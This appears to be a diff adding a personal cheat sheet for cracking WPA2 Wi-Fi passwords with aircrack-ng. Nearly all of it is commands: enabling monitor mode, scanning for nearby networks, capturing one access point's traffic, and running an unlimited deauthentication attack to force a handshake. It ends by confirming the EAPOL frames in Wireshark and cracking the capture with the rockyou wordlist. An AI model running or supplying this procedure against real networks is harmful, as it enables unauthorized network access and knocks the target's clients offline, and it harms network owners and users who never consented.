@@ -1,0 +1,58 @@
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlo1
+
+iw dev  ---> (type must be monitor and Interface = wlan0mon  or wlo1mon)
+
+iwconfig ( watch for wlan0mon Mode:monitor)
+
+sudo airmon-ng
+
+sudo airodump-ng wlo1mon ( to detect wifi around us) --> ( Clt +c to stop after finding your wifi)
+
+note: its for wpa2
+
+{
+
+ BSSID -- mac address
+ PWR -- strength of signal (lower number is good) (1- not possible / 40:Strong Signal / 55:Average / 70-weak/ 80 abve: lower limit)
+ CH -- Channel
+ ENC -- Encryption used (wpa2, wpa3, wpa, opn)
+
+}
+
+copy 
+        1 - BSSID (CC:32:E5:C3:63:B4)   --> is the mac address 
+        2 - 
+        3 - Channle (10)
+        4 - 
+        5 - ESSID (Home)
+        6 -
+
+sudo airodump-ng -w wificapture -c 10 --bssid CC:32:E5:C3:63:B4 wlo1mon
+
+Note : open new window and follow
+
+sudo aireplay-ng --deauth 0 -a CC:32:E5:C3:63:B4 wlo1mon
+
+(once you see handshanke in window1 you can stop or break in window 2 and stop in window 2)
+
+
+ls  ---> (you will see  wificapture-01.cap , wificapture-01.csv , wificapture-01.kismet.csv)
+
+wireshark wificapture-01.cap &
+
+
+filter as eapol 
+
+chek for message in wireshark --->      Auth mess --> WPA Key data
+
+-->>>> Now we can stop monitor Mode
+
+sudo airmon-ng stop wlo1mon
+
+aircrack-ng wificapture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+
+
